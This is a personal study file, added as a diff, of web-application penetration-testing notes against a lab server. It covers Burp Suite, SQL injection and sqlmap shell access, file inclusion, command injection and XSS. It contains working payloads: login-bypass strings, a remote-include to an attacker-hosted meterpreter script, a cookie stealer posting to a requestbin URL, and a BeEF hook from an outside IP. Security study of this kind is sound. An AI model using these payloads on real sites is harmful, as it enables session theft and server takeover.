@@ -1,0 +1,181 @@
+
+ -------------------------------
+| B U R P   S U I T   P R O X Y | [192.168.1.113 = WebAppServer]
+ -------------------------------
+
+We can use a proxy to capture requests and responses between our browser and the web app so we can see exactly what data is being transmitted.
+
+Burp includes:
+- Burp Spider (crawl through web apps content and functionality)
+- Burp Repeater (manipulate and resend requests to the server)
+...
+
+
+[CONFIGURATION] 
+
+Edit -> Preferences -> Advanced -> Network -> Settings (Now we need to configure Manually the proxy configuration IP: 127.0.0.1 and port 8080)
+
+(Firefox): Install FroxyProxy and configure it -> Options -> Add -> Burp: 127.0.0.1 and port 8080
+
+
+[SQL INJECTION]
+
+We can use SQL query to write a simple PHP command shell to web server, this will only work whenever the developer fails to sanitize user inputs when interacting with the database. Succesful SQL injection attacks can read data from the database, modify data, shut down or destroy the database, and sometimes, even run comands on the operating system.
+
+	Example:
+	  SELECT id FROM users WHERE username='$username' AND password='$password';
+	  SELECT username FROM users WHERE username='' AND password='' or '1'='1'
+	  SELECT * FROM users WHERE name='admin'or'1'='1' and password='admin'or'1'='1'L
+	
+	Input test on loggin
+	  Username: ' or ''='
+	  Password: ' or ''='
+
+Because the OR '1'='1' will always be true, this SELECT statement will now return the first username in the table.
+
+To test SQLI we need to check the URL, in case it specifies an id or any parameter from db we just need to put a ' at the end of the query:
+	- Example: http://192.168.1.113/bookservice/bookdetail.aspx?id=1' 
+
+If this pop out a string error from the database on the WebApp, this means it is vulnerable to SQLI so now its our turn to test SQL queries to get the information we want through the errors that are appearing on the screen
+
+	- Example: http://192.168.1.113/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(O))--
+
+
+[USING SQLMAP]
+
+In case the WebApp is vulnerable via URL, we can perform some exploits and attacks through some tools like SQLMap:
+
+	#: sqlmap -u "http://192.168.1.113/bookservice/bookdetail.aspx?id=2" --dump (Dump option will dump the content of the database, details...)
+	#: sqlmap -u "http://192.168.1.113/bookservice/bookdetail.aspx?id=2" --os-shell (We can even try to get a shell on the target server)
+
+[USING XPATH]
+
+We can use XPath injection to attack XML, though its syntax differs from SQL, the injection process is similar.
+
+	Input test on loggin
+	  Username: '
+	  Password: '
+
+Burpsuit proxy offers the posibility to see te requests and responses between us and the server, in case we can percieve any missconfiguration on the authentication and get the credentials we want.
+
+
+	Burpsuite
+	  txtUser: ' or '1'='1
+	  txtPass: ' or '1'='1
+
+
+Now check Proxy params in case we get any response with the right credentials on these fields
+
+
+[LOCAL FILE INCLUSION]
+
+Ability to read files from the application or the rest of the filesystem we should not have access to through the web app. (Like Zervit exploit, getting SAM and SYSTEM)
+
+	Example (Param in Burpsuite):
+	  Body     [c:\inetpub\wwwroot\Book\NewsLetter\Mike]@Mike.com\Web Hacking Review.txt (Branched Path suggests that the newsletter functionallity
+											      is pulling the newsletter from the local filesystem by  
+											      their absolute path)
+
+		   Mike@Mike.com (Looks like there's a folder in the Newsletter folder)
+
+		   C:\inetpub\wwwroot\Book  (Seems as if our app is actually at this path instead of C:\inetpub\wwwroot\bookservice as we might expect 
+					     from the URL)
+
+
+Now is time to test out the vulnerability by changing some parameters to another file in the web app, for example:
+
+	C:\inetpub\wwwroot\Book\Search.aspx  (Display Full service-side source code)
+	C:\inetpub\wwwroot\Book\AuthInfo.xml (Display Auth file with usernames and passwords)
+
+We can even upload files (ex: secret.txt) on the C: drive trough the newsletter functionality by replacing the file (secret.txt) in the request in Burp Suite, in case we can upload files, we can even use LFI vulnerability to execute maicious code on the webserver.
+
+
+[REMOTE FILE INCLUSION]
+
+Remote File Inclusion vulnerabilities allow attackers to load and execute malicious scripts, on a vulnerable server. If we can trick the vulnerable server into executing a remote script, we can run commands on the underlying system.
+	
+	Example:
+	  <?php
+	  include($_GET['file']);
+	  ?>
+
+As an attacker, we can host a malicious PHP script (such as the meterpreter.php) on their webserver and request the page with the file parameter to http://attacker's_ip/meterpreter.php.
+
+The RFI vulnerability would cause meterpreter.php to be eexecuted by the webserver even though it is hosted elsewhere.
+
+[COMMAND EXECUTION]
+
+We can even execute a command and send its output to a file in our app (C:\inetpub\wwwroot\Book\) directory, then we access the files directly to see the command's output.
+
+	Example:
+	  & ipconfig > C:\inetpub\wwwroot\Book\test.txt
+
+When we browse to "http://192.168.1.113/bookservice/test.txt" we will be limited to the privileges of the Internet Information Services User (IIS).
+Even if we don't have full access, we will be able to gather a lot of information about the system with the access we do have:
+
+	netsh advfirewall firewall show rule name=all : To see the rules in the Windows Firewall
+
+
+This leads to a gathering information phase about our target to perform better exploits to get into the system with root/admin privileges.
+
+
+[CROSS-SITE SCRIPTING]
+
+Is known ass the most common vulnerability, where the attackers can inject malicious scripts into an otherwise innocuous site to be executed in the user's browser.
+
+XSS Attacks:
+
+- Reflected XSS: This attack occurs when a malicious script is not being saved on the web server but reflected in the website's results.
+- Stored XSS: This attack occurs when a malicious script is being saved on the web server permanently.
+- DOM based XSS: This attack occurs when the DOM environment is being changed but the code remains the same.
+
+Typical xss test script:
+
+	<script>alert('test')</script>
+	<sCript>alert('test')</sCript>
+	<scr<SCRIPT>ipt>('test')</scr</SCRIPT>ipt>
+	...
+
+XSS cookie stealer:
+
+	<html>
+	<body>
+		(Store in our html code)
+		<script type="text/javascript">document.cookie = "username = Admin";</script>
+		
+		(Get cookies)
+		document.cookie = "username=Admin"
+		document.write(document.cookie)
+
+		(Steal cookies)
+			(Test if the user is ccurrently viewing your comments)
+		exp<img src=0/>
+			(In case the message was readed)
+		exp: <script>document.write("<img src=http://requestbin.net/r/18fqmno1?"+document.cookie+"/>");</script>
+
+		<script type="text/javasccript"> var test="../example.php?cookie_data="+escape(document.cookie);</script>
+		<script>alert(document.cookie)</script>
+				
+	</body>
+	</html>
+
+[XSS VULNERABILITY BEEF]
+
+With BeEF we can "hook" a browser by tricking the user into browsing to our BeEF server, or better yet using the BeEF JavaScript hook as a payload in the presence of an XSS vulnerability.
+
+Execute BeEF (/usr/share/beef)
+
+To "hook" with the .js from beef we just need to load our "<script src=http://85.57.230.177:3000/hook.js></scipt>" into the xss stored vulnerability.
+
+
+[CROSS-SITE REQUEST FORGERY]
+
+Exploits a website's trust in the user's browser. (Get credentials from current session in bank account via malicious website with frame or image tag that triggers HTTP request)
+
+
+[WEB-APP SCANNING WITH W3AF]
+
+W3AF is made up of plugins that perform different web app testing attacks such as looking for URLs, parameteres to test and SQL injectiopn vulnerabilities
+
+
+
